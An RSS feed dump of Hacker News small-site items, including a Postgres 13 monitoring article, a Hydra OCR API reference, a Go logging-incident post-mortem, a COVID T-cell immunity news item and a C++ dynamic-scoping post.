<h2 id="monitoring"><a href="#monitoring" aria-label="monitoring permalink"></a>Monitoring</h2>
<p>Monitoring improvements in Postgres 13 include more details on <code>WAL</code> usage, more options for logging your
queries, and more information on query planning.</p>
<h3 id="wal-usage-stats"><a href="#wal-usage-stats" aria-label="wal usage stats permalink"></a>WAL Usage Stats</h3>
<p>The write-ahead log (<code>WAL</code>) ensures your data stays consistent in the event of a crash, even mid-write. Consistency
is a fundamental property of databases—it ensures your transaction either committed or did not commit; you don't
have to worry about in-between states. But on a busy system, <code>WAL</code> writes can often be a bottleneck. To help
diagnose this, Postgres 13 includes more information on <code>WAL</code> usage from your queries.</p>
<p><code>EXPLAIN</code> now supports information about <code>WAL</code> records generated during execution:</p>
<div data-language="sql"><pre><code><span>EXPLAIN</span> <span>(</span><span>ANALYZE</span><span>,</span> WAL<span>)</span> <span>DELETE</span> <span>FROM</span> users<span>;</span></code></pre></div>
<div data-language="text"><pre><code>                                                    QUERY PLAN                                                     
-------------------------------------------------------------------------------------------------------------------
 Delete on users  (cost=0.00..5409.00 rows=100000 width=6) (actual time=108.910..108.911 rows=0 loops=1)
   WAL: records=100000 fpi=741 bytes=11425721
   -&gt;  Seq Scan on users  (cost=0.00..5409.00 rows=100000 width=6) (actual time=8.519..51.850 rows=100000 loops=1)
 Planning Time: 6.083 ms
 Execution Time: 108.955 ms
(5 rows)</code></pre></div>
<p>You can see that the <code>WAL</code> line includes the number of records generated, the number of full page images (fpi), and
the number of <code>WAL</code> bytes generated. Only non-zero values are printed in the default text format.</p>
<p>This is also available in <code>pg_stat_statements</code>. For example, on our staging environment, here is what we ran to get
the statement that produced the most <code>WAL</code> records:</p>
<div data-language="sql"><pre><code><span>SELECT</span> query<span>,</span> calls<span>,</span> wal_records<span>,</span> wal_fpi<span>,</span> wal_bytes <span>FROM</span> pg_stat_statements
  <span>ORDER</span> <span>BY</span> wal_records <span>DESC</span> <span>LIMIT</span> <span>1</span><span>;</span></code></pre></div>
<div data-language="text"><pre><code>-[ RECORD 1 ]---------------------------------------------------------------------------------------------
query       | CREATE TEMPORARY TABLE upsert_data (server_id uuid NOT NULL, backend_id uuid NOT NULL,
            | query_start timestamp NOT NULL, query_fingerprint bytea NOT NULL, query_text text NOT NULL)
calls       | 7974948
wal_records | 966960816
wal_fpi     | 1018412
wal_bytes   | 100086092097</code></pre></div>
<p>Like many other values in <code>pg_stat_statements</code>, the <code>wal_records</code>, <code>wal_fpi</code>, and <code>wal_bytes</code> values here are
cumulative since the last <code>pg_stat_statements_reset</code> call.</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pganalyze.com/blog/postgres13-better-performance-monitoring-usability">https://pganalyze.com/blog/postgres13-better-performance-monitoring-usability</a></em></p>]]>
            </description>
            <link>https://pganalyze.com/blog/postgres13-better-performance-monitoring-usability</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544881</guid>
            <pubDate>Mon, 21 Sep 2020 15:57:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most disputed scientific studies ever published]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544879">thread link</a>) | @JoshN1986
<br/>
September 21, 2020 | https://scite.ai/search?disputingFrom=1&page=1&sortOn=tally.contradicting&sortOrder=desc&supportingFrom=1&supportingTo=2 | <a href="https://web.archive.org/web/*/https://scite.ai/search?disputingFrom=1&page=1&sortOn=tally.contradicting&sortOrder=desc&supportingFrom=1&supportingTo=2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><i><span>Nature</span></i> volume 428, issue 6985, P821-827</span></p><p><span>Bringing together leaf trait data spanning 2,548 species and 175 sites we describe, for the first time at global scale, a universal spectrum of leaf economics consisting of key chemical, structural and physiological properties. The spectrum runs from quick to slow return on investments of nutrients and dry mass in leaves, and operates largely independently of growth form, plant functional type or biome. Categories along the spectrum would, in general, describe leaf economic variation at the global scale better than plant functional types, because functional types overlap substantially in their leaf traits. Overall, modulation of leaf traits and trait relationships by climate is surprisingly modest, although some striking and significant patterns can be seen. Reliable quantification of the leaf economics spectrum and its interaction with climate will prove valuable for modelling nutrient fluxes and vegetation boundaries under changing land-use and climate.Green leaves are fundamental for the functioning of terrestrial ecosystems. Their pigments are the predominant signal seen from space. Nitrogen uptake and carbon assimilation by plants and the decomposability of leaves drive biogeochemical cycles. Animals, fungi and other heterotrophs in ecosystems are fuelled by photosynthate, and their habitats are structured by the stems on which leaves are deployed. Plants invest photosynthate and mineral nutrients in the construction of leaves, which in turn return a revenue stream of photosynthate over their lifetimes. The photosynthate is used to acquire mineral nutrients, to support metabolism and to re-invest in leaves, their supporting stems and other plant parts.There are more than 250,000 vascular plant species, all engaging in the same processes of investment and reinvestment of carbon and mineral nutrients, and all making enough surplus to ensure continuity to future generations. These processes of investment and re-investment are inherently economic in nature [1][2][3] . Understanding how these processes vary between species, plant functional types and the vegetation of different biomes is a major goal for plant ecology and crucial for modelling how nutrient fluxes and vegetation boundaries will shift with land-use and climate change.
Data set and parametersWe formed a global plant trait network (Glopnet) to quantify leaf economics across the world's plant species. The Glopnet data set spans 2,548 species from 219 families at 175 sites (approximately 1% of the extant vascular plant species). The coverage of traits, species and sites is at least tenfold greater than previous data compilations [4][5][6][7][8][9][10][11] , extends to all vegetated continents, and represents a wide range of vegetation types, from arctic tundra to tropical rainforest, from hot to cold deserts, from boreal forest to grasslands. Site elevation ranges from below sea level (Death Valley, USA) to 4,800 m. Mean annual temperature (MAT) ranges from 216.5 8C to 27.5 8C; mean annual rainfall (MAR) ranges from 133 to 5,300 mm per year. This cove...</span></p></div></div><div><div><p><span><i><span>Arch Gen Psychiatry</span></i> volume 52, issue 12, P1048</span></p><p><span>Posttraumatic stress disorder is more prevalent than previously believed, and is often persistent. Progress in estimating age-at-onset distributions, cohort effects, and the conditional probabilities of PTSD from different types of trauma will require future epidemiologic studies to assess PTSD for all lifetime traumas rather than for only a small number of retrospectively reported "most serious" traumas.</span></p></div></div><div><div><p><span><i><span>Arch Gen Psychiatry</span></i> volume 51, issue 1, P8</span></p><p><span>The prevalence of psychiatric disorders is greater than previously thought to be the case. Furthermore, this morbidity is more highly concentrated than previously recognized in roughly one sixth of the population who have a history of three or more comorbid disorders. This suggests that the causes and consequences of high comorbidity should be the focus of research attention. The majority of people with psychiatric disorders fail to obtain professional treatment. Even among people with a lifetime history of three or more comorbid disorders, the proportion who ever obtain specialty sector mental health treatment is less than 50%. These results argue for the importance of more outreach and more research on barriers to professional help-seeking.</span></p></div></div><div><div><p><span><i><span>British Journal of Social Psychology</span></i> volume 40, issue 4, P471-499</span></p><p><span>The Theory of Planned Behaviour (TPB) has received considerable attention in the literature. The present study is a quantitative integration and review of that research. From a database of 185 independent studies published up to the end of 1997, the TPB accounted for 27% and 39% of the variance in behaviour and intention, respectively. The perceived behavioural control (PBC) construct accounted for significant amounts of variance in intention and behaviour, independent of theory of reasoned action variables. When behaviour measures were self-reports, the TPB accounted for 11% more of the variance in behaviour than when behaviour measures were objective or observed (R2s = .31 and .21, respectively). Attitude, subjective norm and PBC account for significantly more of the variance in individuals' desires than intentions or self-predictions, but intentions and self-predictions were better predictors of behaviour. The subjective norm construct is generally found to be a weak predictor of intentions. This is partly attributable to a combination of poor measurement and the need for expansion of the normative component. The discussion focuses on ways in which current TPB research can be taken forward in the light of the present review.</span></p></div></div><div><div><p><span><i><span>Nat Rev Neurosci</span></i> volume 3, issue 3, P201-215</span></p><p><span>We review evidence for partially segregated networks of brain areas that carry out different attentional functions. One system, which includes parts of the intraparietal cortex and superior frontal cortex, is involved in preparing and applying goal-directed (top-down) selection for stimuli and responses. This system is also modulated by the detection of stimuli. The other system, which includes the temporoparietal cortex and inferior frontal cortex, and is largely lateralized to the right hemisphere, is not involved in top-down selection. Instead, this system is specialized for the detection of behaviourally relevant stimuli, particularly when they are salient or unexpected. This ventral frontoparietal network works as a 'circuit breaker' for the dorsal system, directing attention to salient events. Both attentional systems interact during normal vision, and both are disrupted in unilateral spatial neglect.</span></p></div></div><div><div><p><span><i><span>The Journals of Gerontology Series A: Biological Sciences and M</span></i> volume 56, issue 3, PM146-M157</span></p><p>No abstract</p></div></div><div><div><p><span><i><span>Arch Gen Psychiatry</span></i> volume 62, issue 6, P593</span></p><p><span>About half of Americans will meet the criteria for a DSM-IV disorder sometime in their life, with first onset usually in childhood or adolescence. Interventions aimed at prevention or early treatment need to focus on youth.</span></p></div></div><div><div><p><span><i><span>The Lancet</span></i> volume 358, issue 9286, P958-965</span></p><p><span>In patients with chronic hepatitis C, the most effective therapy is the combination of peginterferon alfa-2b 1.5 microg/kg per week plus ribavirin. The benefit is mostly achieved in patients with HCV genotype 1 infections.</span></p></div></div><div><div><p><span><i><span>Science</span></i> volume 199, issue 4335, P1302-1310</span></p><p><span>The commonly observed high diversity of trees in tropical rain forests and corals on tropical reefs is a nonequilibrium state which, if not disturbed further, will progress toward a low-diversity equilibrium community. This may not happen if gradual changes in climate favor different species. If equilibrium is reached, a lesser degree of diversity may be sustained by niche diversification or by a compensatory mortality that favors inferior competitors. However, tropical forests and reefs are subject to severe disturbances often enough that equilibrium may never be attained.</span></p></div></div><div><div><p><span><i><span>Biometrics</span></i> volume 33, issue 1, P159</span></p><p><span>This paper presents a general statistical methodology for the analysis of multivariate categorical data arising from observer reliability studies. The procedure essentially involves the construction of functions of the observed proportions which are directed at the extent to which the observers agree among themselves and the construction of test statistics for hypotheses involving these functions. Tests for interobserver bias are presented in terms of first-order marginal homogeneity and measures of interobserver agreement are developed as generalized kappa-type statistics. These procedures are illustrated with a clinical diagnosis example from the epidemiological literature.</span></p></div></div></div></div>]]>
            </description>
            <link>https://scite.ai/search?disputingFrom=1&amp;page=1&amp;sortOn=tally.contradicting&amp;sortOrder=desc&amp;supportingFrom=1&amp;supportingTo=2</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544879</guid>
            <pubDate>Mon, 21 Sep 2020 15:57:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hydra API]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544818">thread link</a>) | @siftrics
<br/>
September 21, 2020 | https://siftrics.com/docs/hydra.html | <a href="https://web.archive.org/web/*/https://siftrics.com/docs/hydra.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>The Hydra API recognizes user-specified fields of text in documents. It accounts for skews, shifts, rotations, and changes in layout in each document. It works like this:</p><ol><li>A user uploads a sample document — an invoice, say — and draws bounding boxes around desired text.</li><li>The user programmatically uploads all documents that need to be processed to the Hydra API.</li><li>The Hydra API then recognizes and returns the desired text in each document, taking into account skews, shifts, rotations, changes in layout, and variable size tables.</li></ol><h3>Try it out</h3><p>You can try out the API via a graphical web interface by <a href="https://siftrics.com/create.html">signing up for an account</a> and creating a new data source with the "store results in Siftrics" checkbox unchecked.</p><h3>Without writing any code</h3><p>You can use Hydra without writing any code. There is <a href="http://github.com/siftrics/hydra#command-line-quickstart">a command-line program</a> which takes files in which to recognize text and writes the results to a specified file.</p><h3>For developers</h3><p>We provide official, single-function libraries for the Hydra API:</p><ul><li><a href="https://github.com/siftrics/hydra#go-client-quickstart">Go</a></li><li><a href="https://github.com/siftrics/hydra-js#Quickstart">Node.js (JavaScript)</a></li><li><a href="https://github.com/siftrics/hydra-python#Quickstart">Python</a></li><li>Clojure (Coming Soon)</li></ul><p>Users of other languages must make POST requests to the hydra endpoint.</p><p>Make a POST request to <span>https://siftrics.com/api/hydra/YOUR_DATA_SOURCE_ID/</span> with JSON that looks like this:</p><pre>    {
      "files": [
        {
          "mimeType": "application/pdf",
          "base64File": fileContentsEncodedAsBase64String
        },
        ...
      ]
    }</pre><p>The exact endpoint is provided on the webpage of the data source in question. You can copy-and-paste it from that page, if you so desire.</p><p>Additionally, an API key must be provided by setting the "Authorization" header to</p><pre>    "Basic API_KEY_HERE"</pre><p>Other valid mimeTypes are: "image/bmp", "image/gif", "image/png", "image/jpeg", and "image/jpg".</p><pre>    {
      "Rows": [
        {
          "Error": "",
          "FileIndex": 0,
          "RecognizedText": {
            "My Field 1": "text from your document...",
            "My Field 2": "text from your document...",
            ...
        },
        ...
      ]
    }</pre><p>Each entry in "Rows" corresponds to one file and, in the most common case, one row in a database.</p><p>If "Error" is not an empty string, then there was an error processing that file.</p><p>"FileIndex" is the index of this file in the original request's "files" array. This value is always valid.</p><p>The Hydra API works by making multiple "passes" over each uploaded document. With each pass, the accuracy of results tends to increase.</p><p>It is possible to process documents in half the usual time, by telling the Hydra API to do half the number of passes as it normally would over each document. This behavior can be enabled by setting the top-level boolean field "doFaster" to true in your POST request:</p><pre>    {
      "doFaster": true,
      "files": [
        {
          "mimeType": "application/pdf",
          "base64File": fileContentsEncodedAsBase64String
        },
        ...
      ]
    }</pre><p>Based on our own research, "doFaster" tends to provide accurate results on all documents, except those that are extremely rotated — "doFaster" results are often inaccurate with documents that are rotated more than 90 degrees in any direction. If all of your documents are rotated less than 90 degrees and you want to minimize the amount of time Hydra takes processing each document, it is recommended to enable the "doFaster" behavior.</p></div></div>]]>
            </description>
            <link>https://siftrics.com/docs/hydra.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544818</guid>
            <pubDate>Mon, 21 Sep 2020 15:53:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Logorrhea]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544815">thread link</a>) | @rhema
<br/>
September 21, 2020 | https://blog.afoolishmanifesto.com/posts/logorrhea/ | <a href="https://web.archive.org/web/*/https://blog.afoolishmanifesto.com/posts/logorrhea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
<div>
<div>
<p>I was part of a convergence of changes that ended up causing us to lose 30% of
important logs. The full investigation involved application, log pipeline, and
Kubernetes integration. <em>Read how it happened.</em></p>

<p>(If this is too much for you, skip to <a href="#the-takeaway">the takeaway</a> and read
much less.)</p>
<p>At ZipRecruiter we use logs to record important business metrics. For example,
we emit a log line when a job seeker applies to a job. That log line can be
consumed (almost) realtime from Kafka, or offline from our S3 hosted data lake.</p>
<p>On Sunday, 31, May 2020, shortly before we put our kids down for nap, an
analyst mentioned that he noticed a significant (~30%) reduction in log
volume from my service. He couldn’t make heads or tails of it and asked if I
could take a look.</p>
<p>Once the boys were down I started to investigate. It was an effective
distraction from the helicopters, protesting, and eventual rioting going on
only four blocks from my apartment.</p>
<p>That whole day (and part of the following day) <a href="#sql-to-investigate-logs">I used Athena and SQLite to
analyze the logs</a>. In the end I found no pattern other
than some scant log loss.</p>
<p>The most typical cause of log loss is emitting non-json interleaved with json,
which would implicate something in my service. I checked for that and found no
evidence that it had been happening.</p>
<p>One of the product people who were pitching in while I was digging asked if
this reduction in records could be organic. There were helicopters! People
were legit rioting! Also COVID-19 had sent people home in the prior two weeks.
Did the civil unrest really reduce our traffic by 30%?</p>
<p>My assumption was that we were legitimately losing logs, it was not caused by a
simple bug affecting the data, but instead a systemic bug in either the logging
library or the logging infrastructure itself (which has for years been
incredibly resilient.)</p>
<p>At some point <a href="https://www.aaronhopkins.com/">Aaron</a> looked at the rate at
which we were logging. We built our logging pipeline to support up to 10
megabytes logged per second. This thing was logging <em>50 megabytes per second.</em>
Yikes.</p>
<hr>
<p>Let me take a this opportunity to explain the interface to our logging system,
along with some details about how that’s implemented. The interface is
deceptively simple:</p>
<ul>
<li>Applications log to standard out and standard error</li>
<li>The logs must be JSON</li>
</ul>
<p>Logs are intended to be available to engineers within a few minutes (but
often are available within seconds.)</p>
<p>The implementation (at least the very beginning of it) is that we have a
program called <code>tsar</code> that works as both a supervisor and log capturer. It
captures the logs and wraps them in JSON if it needs to. It sets the pipe
buffer size on stdout and stderr so our logs can be atomically written for our
required size (1 megabyte.)</p>
<p>That then reëmits the logs, but serially such that they will never be
interleaved. As it stands today, Docker captures those and writes them to disk
in configurably sized chunks before starting to write to a new file. It deletes
the old files after there are too many other files, again configurably.</p>
<p>Another tool, <code>filebeat</code>, picks up the files as they are written to and streams
the files up to kafka. <code>filebeat</code> notices writes via <code>inotify</code> and keeps the
files open, so in theory you can never lose data.</p>
<p>The problem is, it only checks for <em>new files</em> every so often (maybe every 20
seconds.) I don’t recall the exact numbers, but basically the size of the
files docker was writing were something like 100 Megs, and it would keep up to
five around. So we were writing 50 megs per second to 100 megabyte files and
only keep five of them. In total this means we buffer a mere 10 seconds of
logs on disk in this situation.</p>
<p>Yikes.</p>
<hr>
<p>This was worsened when Aaron had made the application that was logging more
efficient, and packed it into fewer containers with more cores. Instead of
before, running (something like) 20 two cpu containers (each theoretically
logging 25 megs per second) we were now running 10 four cpu containers, now
logging the extreme 50 megs per second. Ok so fine, we revert this efficiency
change, increase the file size docker uses to buffer logs, and move on.</p>
<hr>
<p>A few days pass and someone on the analytics team says: “fREW, we are logging
records that we shouldn’t be for X.” This is not unusual; it’s a new project,
mistakes are made and we fix them and move on. The odd detail here is that I
had <em>explicitly</em> written code to handle this case, because we knew these
records were worthless.</p>
<p>Here’s the buggy code:</p>
<div><pre><code data-lang="golang">		<span>switch</span> <span>distiller</span>.(<span>type</span>) {
		<span>case</span> <span>theCoolAPI</span>:
			<span>/* HEY */</span> <span>pjResp</span>.<span>AllJobs</span>[<span>i</span>].<span>ImpressionLogged</span> = <span>/* HEY */</span> <span>true</span> <span>// IF SOMEONE COPY PASTES THIS CODE I'LL FIND YOU.
</span><span></span>		<span>default</span>:</code></pre></div>
<p>Here’s the fix:</p>
<div><pre><code data-lang="golang">		<span>switch</span> <span>distiller</span>.(<span>type</span>) {
		<span>case</span> <span>*</span><span>theCoolAPI</span>:
			<span>/* HEY */</span> <span>pjResp</span>.<span>AllJobs</span>[<span>i</span>].<span>ImpressionLogged</span> = <span>/* HEY */</span> <span>true</span> <span>// IF SOMEONE COPY PASTES THIS CODE I'LL FIND YOU.
</span><span></span>		<span>default</span>:</code></pre></div>
<p>Did you catch that? It’s <em>a single character fix.</em> The problem is, the
<code>distiller</code> value could be implemented by either a <code>theCoolAPI</code> value or a
pointer to it (<code>*theCoolAPI</code>.) Worse: it had worked previously, but in
the course of regular changes, because we needed to start mutating a value, I
replaced what actually used to be a <code>theCoolAPI</code> value with a pointer to one.</p>
<p>Gracious. So I fix this, but this time <a href="#test-to-validate-the-fix">I wrote a test, to ensure that this
very subtle behavior will not regress.</a></p>
<p>I rolled it out with a sneaking suspicion, wait a few hours, and check our log
rate.</p>
<p>Before the change: 50 megabytes per second, after the change <strong>five megabytes
per second.</strong> We knew these records were high volume and low value, but of
course we never really considered how high volume they were before. Nearly
<em>ten times the rest of the volume of the system.</em></p>
<hr>
<p>This was such a frustrating incident. To fix it we needed to rope in high
level app devs, low level system people who worked on the logging pipeline, and
lower level people who knew how we’d integrated the pipeline with kubernetes.
And that wasn’t even the “real” root cause! The fundamental issue was that
a type assertion in Go was subtly wrong.</p>
<h2 id="the-takeaway"><a href="#the-takeaway" arialabel="Anchor"> 🔗 </a> The Takeaway</h2>
<p>To me this emphasizes one specific idea and one general idea.</p>
<p>The specific idea is, when you are doing type assertions in Go, you really
should have a test that validates that it is correct. Frustratingly, errors
are checked via type assertions and can be incredibly difficult to trigger in a
test. Also: if you injected the error via a mock, you are not actually testing
the codepath that you should be checking. <em>angst</em></p>
<p>The general idea is: root causes are fractal. It would be nice if there were a
single issue here, but real production incidents are almost never that simple.
These complex systems, both social and technical, fail in more ways than you
will ever guess. I am regularly rewarded by diving deeper, or fixing the issue
“a layer lower” to categorically solve issues.</p>
<hr>
<p>(Much thanks to <a href="https://xdg.me/">David Golden</a>, <a href="http://hiddenrealms.org/">Matthew
Horsfall</a>, <a href="https://hoelz.ro/">Rob Hoelz</a>, <a href="https://genehack.org/">John
Anderson</a>, and <a href="https://twitter.com/scuilion">Kevin
O’Neal</a> for review of this post.)</p>
<hr>
<p>I think <a target="_blank" href="https://www.amazon.com/gp/product/1492029505/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1492029505&amp;linkCode=as2&amp;tag=afoolishmanif-20&amp;linkId=00cf11fe356cdbbd398f492d25736e7b">The Site Reliability Workbook</a><img src="https://ir-na.amazon-adsystem.com/e/ir?t=afoolishmanif-20&amp;l=am2&amp;o=1&amp;a=1492029505" width="1" height="1" alt="">
gives a description of this kind of incident analysis can be done. It’s a good
book, but really, the best teacher is practice. If you want to dig deeper when
it matters, exercise your skill by digging deeper in non-emergency incidents.</p>
<p>To learn more about Go I suspect I’ll forever recommend
<a target="_blank" href="https://www.amazon.com/gp/product/0134190440/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0134190440&amp;linkCode=as2&amp;tag=afoolishmanif-20&amp;linkId=9ce3dc1667339e430d3b8a4b515b0420">The Go Programming Language</a><img src="https://ir-na.amazon-adsystem.com/e/ir?t=afoolishmanif-20&amp;l=am2&amp;o=1&amp;a=0134190440" width="1" height="1" alt="">.
I found it a good overview of the language that equipped me to write
solid production code.</p>
<h2 id="appendices"><a href="#appendices" arialabel="Anchor"> 🔗 </a> Appendices</h2>
<h3 id="sql-to-investigate-logs"><a href="#sql-to-investigate-logs" arialabel="Anchor"> 🔗 </a> SQL to Investigate Logs</h3>
<p>There is a lot of data here; so much that two days of data (which I am
analyzing below) wouldn’t even fit on my laptop (about 22 gigs per day.)</p>
<p>I started off by running an Athena query to get a small subset of the logs I
could look at in more depth:</p>
<div><pre><code data-lang="sql"><span>SELECT</span> <span>*</span>
  <span>FROM</span> data_logs
 <span>WHERE</span> log_date <span>=</span> <span>20200529</span> <span>and</span>
       placement_id <span>=</span> <span>37864</span> <span>and</span>
       to_hex(md5(to_utf8(impression_set_id))) <span>LIKE</span> <span>'%FF'</span></code></pre></div>
<p>In the above query, I hash <code>impression_set_id</code> with md5 and then use <code>LIKE
'%FF'</code> to get a 256th of it.</p>
<p>I changed the date to <code>20200501</code> to compare to a working subset as well.</p>
<p>I downloaded the results from Athena as CSV into sensibly named files. That
gave me a pleasantly small (~88 megs) dataset to work with. I then used SQLite
to dig into that data:</p>
<pre><code>create table old("actual_daily_spend_millicents","bid_millicents","campaign_id","engine_cargo","engine_id","expected_daily_spend_millicents","impression_id","is_predicted_giveaway","is_tracking_daily_spend","job_id","outer_request_id","placement_buyer_rules_uri","placement_cargo","placement_id","request_id","sort_position","target_daily_spend_millicents","viewer_id","viewer_property_id","log_timestamp_string","load_timestamp_utc","jobs_skipped","impression_set_id","impression_superset_id","built_for_viewer_id","built_for_viewer_realm","listing_key","listing_version","buyer_bid_millicents","log_date");
.mode csv
.import 2020-05-01.csv old
create table new("actual_daily_spend_millicents","bid_millicents","campaign_id","engine_cargo","engine_id","expected_daily_spend_millicents","impression_id","is_predicted_giveaway","is_tracking_daily_spend","job_id","outer_request_id","placement_buyer_rules_uri","placement_cargo","placement_id","request_id","sort_position","target_daily_spend_millicents","viewer_id","viewer_property_id","log_timestamp_string","load_timestamp_utc","jobs_skipped","impression_set_id","impression_superset_id","built_for_viewer_id","built_for_viewer_realm","listing_key","listing_version","buyer_bid_millicents","log_date");
.import 2020-05-29.csv new
</code></pre>
<p>I verified our initial observations:</p>
<pre><code>sqlite&gt; select count(*) from (select DISTINCT(impression_set_id) FROM old);
1128
sqlite&gt; select count(*) from (select DISTINCT(impression_set_id) FROM new);
758
</code></pre>
<p>My first instinct was that somehow we were filtering the data that was
being logged, so I made a scrappy histogram of the sets of data:</p>
<pre><code>sqlite&gt; select c from (select COUNT(*) AS c FROM old group by impression_set_id) order by c LIMIT 1 OFFSET cast(0.5*1128 as int);
59
sqlite&gt; select c from (select COUNT(*) AS c FROM old group by impression_set_id) order by c LIMIT 1 …</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.afoolishmanifesto.com/posts/logorrhea/">https://blog.afoolishmanifesto.com/posts/logorrhea/</a></em></p>]]>
            </description>
            <link>https://blog.afoolishmanifesto.com/posts/logorrhea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544815</guid>
            <pubDate>Mon, 21 Sep 2020 15:53:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Immunity to Covid-19 is probably higher than tests have shown]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544727">thread link</a>) | @nradov
<br/>
September 21, 2020 | https://news.ki.se/immunity-to-covid-19-is-probably-higher-than-tests-have-shown | <a href="https://web.archive.org/web/*/https://news.ki.se/immunity-to-covid-19-is-probably-higher-than-tests-have-shown">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img src="https://news.ki.se/sites/default/files/styles/article_full_width/public/qbank/Ljunggren_HansGustaf_13_SIR-custom20200629160009.jpg" alt="Portrait of Hans-Gustaf Ljunggren"></p><p>Hans-Gustaf Ljunggren. Photo: Ulf Sirborn</p>
                  </div><div>
        
            <p>“Our results indicate that public immunity to COVID-19 is probably significantly higher than antibody tests have suggested,” says Professor <a href="https://staff.ki.se/people/hanlju">Hans-Gustaf Ljunggren</a> at the Center for Infectious Medicine, Karolinska Institutet, and co-senior author. “If this is the case, it is of course very good news from a public health perspective.”</p>

<p>T-cell analyses are more complicated to perform than antibody tests and at present are therefore only done in specialised laboratories, such as that at the Center for Infectious Medicine at Karolinska Institutet.</p>

<p>“Larger and more longitudinal studies must now be done on both T cells and antibodies to understand how long-lasting the immunity is and how these different components of COVID-19 immunity are related,” says Marcus Buggert.</p>

<p><a href="https://www.biorxiv.org/content/10.1101/2020.06.29.174888v1">The results were first published on 29 June 2020 on a preprint server, bioRxiv</a> (see box) and a previous version of this news article was then published. The study has now undergone peer review and been published in the scientific journal <em>Cell.&nbsp;</em>In connection with this, <a href="https://www.eurekalert.org/pub_releases/2020-08/cp-mcc081720.php">Cell Press issued a press release about the results</a>.</p>

<p>The study was financed by the Knut and Alice Wallenberg Foundation, Nordstjernan AB, the Swedish Research Council, Karolinska Institutet, the Swedish Society for Medical Research, the Jeansson Foundations, the Åke Wiberg Foundation, the Swedish Society of Medicine, the Swedish Cancer Society, the Swedish Childhood Cancer Foundation, the Magnus Bergvall Foundation, the Hedlund Foundation, the Lars Hierta Foundation, the Swedish Physicians against AIDS foundation, the Jonas Söderquist Foundation, the Clas Groschinsky Memorial Foundation, and the Wellcome Trust.&nbsp;The authors report no conflicts of interest or patents associated with the results of the study.</p>

<h2>Publication</h2>

<p><a href="https://www.cell.com/cell/fulltext/S0092-8674(20)31008-4">“Robust T cell immunity in convalescent individuals with asymptomatic or mild COVID-19”</a><br>
Takuya Sekine, André Perez-Potti, Olga Rivera-Ballesteros, Jean-Baptiste Gorin, Annika Olsson, Habiba Kamal, Sian Llewellyn-Lacey, David Wulliman, Tobias Kamann, Gordana Bogdanovic, Sandra Muschiol, Elin Folkesson, Olav Rooyackers, Lars I. Eriksson, Anders Sönnerborg, Tobias Allander, Jan Albert, Morten Nielsen, Kristoffer Strålin, Sara Gredmark-Russ, Niklas K. Björkström, Johan K. Sandberg, David A. Price, Hans-Gustaf Ljunggren, Soo Aleman, Marcus Buggert, Karolinska COVID-19 Study Group.<br><em>Cell</em>, online 14 August 2020, doi:&nbsp;10.1016/j.cell.2020.08.017</p>
      
      </div></div>]]>
            </description>
            <link>https://news.ki.se/immunity-to-covid-19-is-probably-higher-than-tests-have-shown</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544727</guid>
            <pubDate>Mon, 21 Sep 2020 15:46:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Scoping in C++]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 54 (<a href="https://news.ycombinator.com/item?id=24544716">thread link</a>) | @stettberger
<br/>
September 21, 2020 | https://blog.dokucode.de/posts/2020-07-10-Dynamic-Scoping-in-CPP.html | <a href="https://web.archive.org/web/*/https://blog.dokucode.de/posts/2020-07-10-Dynamic-Scoping-in-CPP.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page-post-dynamic-scope-cpp">
            <ol>
                      <li><a href="https://blog.dokucode.de/index.html">Home</a></li>

    <li><a href="https://blog.dokucode.de/posts.html">Posts</a></li>

    <li><strong>Dynamic Scoping in C++</strong> </li>

    </ol>

           
  <p><i>Date: 2020-07-10</i></p><p>I always had a faible for dynamic scoping as it is implemented in
Common Lisp, Emacs Lisp, or LaTeX. To me, it seems that dynamic
scoping is an almost forgotten technique and dismissed technique in
modern programming. While it is more complex to understand and more
magically than lexical scoping, there are some applications that
benefit from dynamic scoping.</p>
<p>In lexical scoping, if you access a variable, your compiler will start
searching the declaration from the point of reference outwards in
lexical order. This means it searches first in the most inner scope,
and continoues to widen its search scope by the "closed-nested-scope
rule". For example, in the following code snippet, the call to <code>foo()</code>
would return 23, as the lexcially-closest declaration is the global variable.</p>
<div><pre><span></span><span>int</span> <span>config</span> <span>=</span> <span>23</span><span>;</span>

<span>return</span> <span>foo</span><span>()</span> <span>{</span>
    <span>return</span> <span>config</span><span>;</span>
<span>}</span>

<span>void</span> <span>bar</span><span>()</span> <span>{</span>
    <span>int</span> <span>config</span> <span>=</span> <span>42</span><span>;</span>
    <span>printf</span><span>(</span><span>"%d</span><span>\"</span><span>, foo());</span>
<span>}</span>
</pre></div>


<p>With dynamic scoping, the world would look different as the closest
(time-wise) dynamic binding for a given name is found instead of
lexically closest. In the example, <code>foo()</code> would return 42, as the
binding in <code>bar()</code> happened more recently that the global binding.</p>
